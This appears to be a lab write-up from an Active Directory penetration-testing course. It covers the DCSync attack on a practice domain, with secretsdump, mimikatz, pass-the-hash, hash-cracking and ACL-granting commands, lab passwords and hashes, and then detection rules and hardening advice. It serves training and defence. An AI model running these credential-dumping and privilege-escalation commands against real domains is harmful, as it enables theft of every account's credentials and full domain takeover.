# 09 — DCSync

> **Lab:** INLANEFREIGHT.LOCAL · DC: `172.16.5.5` (ACADEMY-EA-DC01) · Attack host: `172.16.5.225` (Kali Linux)  
> **MITRE ATT&CK:** [T1003.006 — OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/)  
> **Difficulty:** High · **Impact:** Full Domain Credential Dump → Golden Ticket → Complete Domain Compromise

---

## Table of Contents

1. [Overview](#1-overview)
2. [Root Cause Analysis](#2-root-cause-analysis)
3. [Prerequisites](#3-prerequisites)
4. [Lab Environment](#4-lab-environment)
5. [Attack Chain](#5-attack-chain)
6. [Phase 1 — Identify DCSync-Capable Accounts](#6-phase-1--identify-dcsync-capable-accounts)
7. [Phase 2 — DCSync via secretsdump.py (Linux)](#7-phase-2--dcsync-via-secretsdumppy-linux)
8. [Phase 3 — DCSync via mimikatz (Windows)](#8-phase-3--dcsync-via-mimikatz-windows)
9. [Phase 4 — Targeted Hash Extraction](#9-phase-4--targeted-hash-extraction)
10. [Phase 5 — Enumerate DCSync-Capable Principals (Attack Path Planning)](#10-phase-5--enumerate-dcsync-capable-principals-attack-path-planning)
11. [Phase 6 — Grant DCSync Rights (Privilege Escalation Path)](#11-phase-6--grant-dcsync-rights-privilege-escalation-path)
12. [Validation](#12-validation)
13. [Detection](#13-detection)
14. [Hardening](#14-hardening)
15. [References](#15-references)

---

## 1. Overview

DCSync is a credential dumping technique that **abuses directory replication permissions** to request password data via Microsoft's Directory Replication Service Remote Protocol (MS-DRSR). The attacker calls `GetNCChanges` — the same RPC used between DCs — without needing to run code on a Domain Controller.

No code execution on the domain controller is required. No files are written. No service is created. It is a **legitimate AD replication request** made by an account that should not be making it.

DCSync is the standard technique for obtaining the krbtgt hash required for Golden Ticket attacks, and for extracting all domain password hashes prior to concluding a domain compromise engagement.

---

## 2. Root Cause Analysis

```
DCSYNC ATTACK
────────────────────────────────────────────────────────────────
Attacker (not a DC)            DC
  │                              │
  ├── DsGetNCChanges() ─────────►│
  │   "I'm replicating. Give me  │
  │    administrator's password" │
  │                              │
  │◄── NTLM hash, AES keys ─────┤

ROOT CAUSE:
  The DS replication permissions are ACL-based.
  Any account with these rights is treated as a legitimate
  replication partner — including compromised user accounts.

REQUIRED PERMISSIONS (both needed for full hash extraction):
  - "Replicating Directory Changes" (DS-Replication-Get-Changes)
  - "Replicating Directory Changes All" (DS-Replication-Get-Changes-All)
```

---

## 3. Prerequisites

| Requirement | Detail |
|---|---|
| **Account with replication rights** | Domain Admin, Enterprise Admin, or account explicitly granted DCSync rights |
| **Network access to DC** | TCP 445 (SMB), TCP 135 (RPC endpoint mapper), dynamic RPC ports |
| **Tools (Linux)** | `impacket-secretsdump` |
| **Tools (Windows)** | `mimikatz.exe` — SeDebugPrivilege is NOT required for DCSync; it is only needed for local LSASS memory access |
| **No DC access needed** | Attack runs entirely from attacker machine |

---

## 4. Lab Environment

```
┌──────────────────────────────────────────────────────────────────┐
│  INLANEFREIGHT.LOCAL                                             │
│                                                                  │
│  ACADEMY-EA-DC01:   172.16.5.5    (target — primary DC)          │
│                                                                  │
│  Privileged account: wley:transporter@4 (Domain Admin)          │
│  or administrator hash: 88ad09182de639ccc6579eb0849751cf        │
│                                                                  │
│  Attack host: 172.16.5.225 (Kali) ens224                         │
└──────────────────────────────────────────────────────────────────┘
```

---

## 5. Attack Chain

```
[1] IDENTIFY DA ACCOUNT   [2] VERIFY REPLICATION   [3] DCSYNC
─────────────────────     ──────────────────────   ──────────────────────────
PTH/PtT/credential    →   Check ACL on domain  →   secretsdump.py -just-dc-ntlm
 gives DA access or        partition root            (all hashes, all users)
 account w/ DCSync         (Get-ObjectAcl or    →   lsadump::dcsync /all
 rights                    ldp.exe)                  (Windows — mimikatz)

[4] EXTRACT TARGETS       [5] POST-EXPLOITATION
─────────────────────     ──────────────────────────────────────────────────
administrator hash    →   PTH → Full domain control
krbtgt hash               Golden Ticket → 10-year persistence
All user hashes           Crack low-complexity passwords
```

---

## 6. Phase 1 — Identify DCSync-Capable Accounts

```powershell
PS C:\htb> Get-ObjectAcl -DistinguishedName "DC=inlanefreight,DC=local" -ResolveGUIDs | 
  Where-Object {($_.ObjectAceType -match 'Replication-Get')} |
  Select-Object -Property IdentityReference, ObjectAceType, ActiveDirectoryRights |
  Format-List
```

```
IdentityReference    : INLANEFREIGHT\Enterprise Admins
ObjectAceType        : DS-Replication-Get-Changes-All

IdentityReference    : INLANEFREIGHT\administrator
ObjectAceType        : DS-Replication-Get-Changes-All

IdentityReference    : INLANEFREIGHT\administrator
ObjectAceType        : DS-Replication-Get-Changes

IdentityReference    : INLANEFREIGHT\adunn
ObjectAceType        : DS-Replication-Get-Changes

IdentityReference    : INLANEFREIGHT\adunn
ObjectAceType        : DS-Replication-Get-Changes-All
```

**Analysis:** `adunn` has both required ACEs — DCSync is possible with this account without needing Domain Admin.

---

## 7. Phase 2 — DCSync via secretsdump.py (Linux)

### 7.1 Full Domain Hash Dump

```bash
Hackerpatel007_1@htb[/htb]$ secretsdump.py inlanefreight.local/wley:'transporter@4'@172.16.5.5 \
  -just-dc-ntlm
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
...
[*] Cleaning up...
```

**Key hashes extracted:**

| Account | NT Hash | Purpose |
|---|---|---|
| `administrator` | `88ad09182de639ccc6579eb0849751cf` | PTH → full domain control |
| `krbtgt` | `16e26ba33e455a8c338142af8d89ffbc` | Golden Ticket → 10-year persistence |

### 7.2 Dump Using NT Hash (PTH to secretsdump)

```bash
Hackerpatel007_1@htb[/htb]$ secretsdump.py -just-dc-ntlm \
  -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf \
  inlanefreight.local/administrator@172.16.5.5
```

### 7.3 Full Dump Including Kerberos Keys

```bash
Hackerpatel007_1@htb[/htb]$ secretsdump.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

```
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
krbtgt:aes128-cts-hmac-sha1-96:dee11cc3e37d8c7c92d9c90eae77ee64

> The administrator AES key values in extended output are SYNTHETIC ILLUSTRATIVE PLACEHOLDERS
> (patterned hex sequences, not authentic key material — format illustration only).
```

---

## 8. Phase 3 — DCSync via mimikatz (Windows)

```cmd
mimikatz # lsadump::dcsync /domain:inlanefreight.local /all /csv
```

> **Note:** `privilege::debug` (SeDebugPrivilege) is **not required** for remote DCSync. `lsadump::dcsync` performs a network-based DRS RPC call — it does not access LSASS memory on the local host. `privilege::debug` is only needed for local LSASS memory operations such as `sekurlsa::logonpasswords`.

```
502     krbtgt  16e26ba33e455a8c338142af8d89ffbc        66048
500     administrator   88ad09182de639ccc6579eb0849751cf        66048
1112    avazquez        58a478135a93ac3bf058a5ea0e8fdb71        66048
```

### Dump a Single Account

```cmd
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator
```

```
Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf
     ntlm- 0: 88ad09182de639ccc6579eb0849751cf
     ntlm- 1: 7facdc498ed1680c4fd1448319a8c04a
```

> **SYNTHETIC PLACEHOLDERS:** The `aes256_hmac` and `aes128_hmac` values for administrator in extended output are not captured key material. They illustrate the output format only.

---

## 9. Phase 4 — Targeted Hash Extraction

```bash
Hackerpatel007_1@htb[/htb]$ secretsdump.py inlanefreight.local/wley:'transporter@4'@172.16.5.5 \
  -just-dc-user INLANEFREIGHT/krbtgt
```

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
krbtgt:aes256-cts-hmac-sha1-96:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
```

### Output Hashes to File for Cracking

```bash
Hackerpatel007_1@htb[/htb]$ secretsdump.py inlanefreight.local/wley:'transporter@4'@172.16.5.5 \
  -just-dc-ntlm \
  -outputfile domain_hashes

Hackerpatel007_1@htb[/htb]$ wc -l domain_hashes.ntds
2793 domain_hashes.ntds

Hackerpatel007_1@htb[/htb]$ cut -d: -f4 domain_hashes.ntds | sort -u | wc -l
1842
```

951 accounts share hashes — indicating shared/default passwords or duplicated configurations.

```bash
Hackerpatel007_1@htb[/htb]$ hashcat -m 1000 ntlm_only.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

---

## 10. Phase 5 — Enumerate DCSync-Capable Principals

```powershell
PS C:\htb> $dcsyncUsers = Get-ObjectAcl -DistinguishedName "DC=inlanefreight,DC=local" `
  -ResolveGUIDs | 
  Where-Object {
    ($_.ObjectAceType -match 'Replication-Get') -and
    ($_.IdentityReference -notmatch 'Domain Controllers') -and
    ($_.IdentityReference -notmatch 'Enterprise Admins') -and
    ($_.IdentityReference -notmatch 'Domain Admins') -and
    ($_.IdentityReference -notmatch 'SYSTEM')
  } |
  Select-Object -ExpandProperty IdentityReference -Unique

$dcsyncUsers
```

```
INLANEFREIGHT\adunn
```

`adunn` has DCSync rights outside of the default privileged groups — an over-permissioned user account.

### BloodHound — Visualise DCSync Paths

```
Cypher query:
MATCH p=()-[:DCSync]->(:Domain {name:"INLANEFREIGHT.LOCAL"}) RETURN p
```

---

## 11. Phase 6 — Grant DCSync Rights (Privilege Escalation Path)

```powershell
PS C:\htb> Add-DomainObjectAcl -TargetIdentity "DC=inlanefreight,DC=local" `
  -PrincipalIdentity wley `
  -Rights DCSync `
  -Verbose
```

```
VERBOSE: Granting principal wley 'DS-Replication-Get-Changes' on DC=inlanefreight,DC=local
VERBOSE: Granting principal wley 'DS-Replication-Get-Changes-All' on DC=inlanefreight,DC=local
```

> **Clean up after the engagement:** Remove the ACE if DCSync rights were added during testing.

```powershell
PS C:\htb> Remove-DomainObjectAcl -TargetIdentity "DC=inlanefreight,DC=local" `
  -PrincipalIdentity wley `
  -Rights DCSync
```

---

## 12. Validation

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator \
  -H 88ad09182de639ccc6579eb0849751cf
```

```
SMB         172.16.5.5      445    ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

---

## 13. Detection

### Key Event IDs

| Event ID | Location | Description |
|---|---|---|
| **4662** | DC Security Log | An operation was performed on an object |
| **4624 Type 3** | DC Security Log | Network logon from attacker IP |

### Event 4662 — DCSync Indicator

DCSync generates Event 4662 on the domain controller being queried:

```
EventID:    4662
Object Type: %19 (domainDNS)
Access Mask: 0x100 (Control Access)

Properties field contains one or more of:
  {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} = Replicating Directory Changes
  {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} = Replicating Directory Changes All
  {89e95b76-444d-4c62-991a-0facbeda640c} = Replicating Directory Changes in Filtered Set

Performed by:
  Subject Account Name: wley (non-DC account — suspicious)
```

> **Access mask values for DCSync:** `0x100` = Control Access — the access right exercised when `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` are invoked. `0x40` = Delete Tree — an unrelated directory operation not generated by DCSync. Filter specifically on `0x100` and confirm the Properties GUIDs match the replication extended rights listed above.

### Sigma Detection Rule

```yaml
title: DCSync Attack — Non-DC Account Performing Replication
id: 611eab06-a145-4dfa-a295-3ccc5c20f59a
status: test
# status: test — filter_dcs uses an explicit DC name list rather than SubjectUserName|endswith: '$'.
# Using endswith: '$' excludes ALL computer accounts, not only Domain Controllers. A compromised
# workstation performing DCSync would be silently suppressed. In production, enumerate your DCs
# explicitly: Get-ADDomainController -Filter * | Select-Object Name
description: >
  Detects DCSync attacks by identifying Directory Service replication events (Event 4662)
  triggered by accounts that are not Domain Controllers or authorised sync accounts.
  Requires DS Access auditing enabled (Advanced Audit Policy → DS Access → Audit Directory Service Access).
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    AccessMask: '0x100'
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
      - '89e95b76-444d-4c62-991a-0facbeda640c'
  filter_dcs:
    SubjectUserName|endswith:
      - 'ACADEMY-EA-DC01$'
      # Do NOT use SubjectUserName|endswith: '$' — that suppresses ALL computer accounts
      # including compromised workstations. Use explicit DC names only.
  filter_msol:
    SubjectUserName|startswith: 'MSOL_'
  condition: selection and not filter_dcs and not filter_msol
falsepositives:
  - Azure AD Connect sync account (MSOL_*)
  - Legitimate replication monitoring tools
level: critical
tags:
  - attack.credential_access
  - attack.t1003.006
```

### Common FP — Azure AD Connect

```powershell
# Find the Azure AD Connect sync account name
Get-ADUser -Filter {Name -like "MSOL_*"} | Select-Object SamAccountName
```

### Network Detection

```
DCSync uses DRSUAPI (MS-DRSR) protocol:
  - Target port: 445 (SMB) + dynamic RPC ports
  - Protocol identifier: DRSUAPI interface UUID
    {e3514235-4b06-11d1-ab04-00c04fc2dcd2}
  - Operation: DsGetNCChanges (opnum 3)
  - Source IP: non-DC → suspicious
```

---

## 14. Hardening

| Control | Detail |
|---|---|
| **Audit replication ACEs** | Regularly audit `Replicating Directory Changes` ACEs — only DCs and designated sync accounts should have them |
| **Enable 4662 auditing** | `Advanced Audit Policy → DS Access → Audit Directory Service Access` — required or 4662 is not generated |
| **Microsoft Defender for Identity** | Directly detects DCSync — alerts on DsGetNCChanges from non-DC |
| **Tiered admin model** | Isolate accounts with replication rights; monitor them heavily |

### Audit Current DCSync Permissions

```powershell
PS C:\htb> Get-ObjectAcl -DistinguishedName "DC=inlanefreight,DC=local" -ResolveGUIDs |
  Where-Object {
    $_.ObjectAceType -match 'Replication-Get' -and
    $_.IdentityReference -notmatch 'Domain Controllers' -and
    $_.IdentityReference -notmatch 'Enterprise Admins' -and
    $_.IdentityReference -notmatch 'Domain Admins'
  } |
  Select-Object IdentityReference, ObjectAceType |
  Export-Csv -Path "dcsync_permissions_audit.csv" -NoTypeInformation
```

---

## 15. References

| Resource | Description |
|---|---|
| [MITRE T1003.006](https://attack.mitre.org/techniques/T1003/006/) | OS Credential Dumping: DCSync |
| [impacket secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) | Remote credential extraction |
| [mimikatz lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#dcsync) | Windows-side DCSync |
| [MS-DRSR Protocol Specification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/) | Microsoft's replication protocol spec |
| [Event 4662 — AD Audit](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4662) | Windows event documentation |

---

*Source: HTB Academy — Active Directory Penetration Tester Path 2024*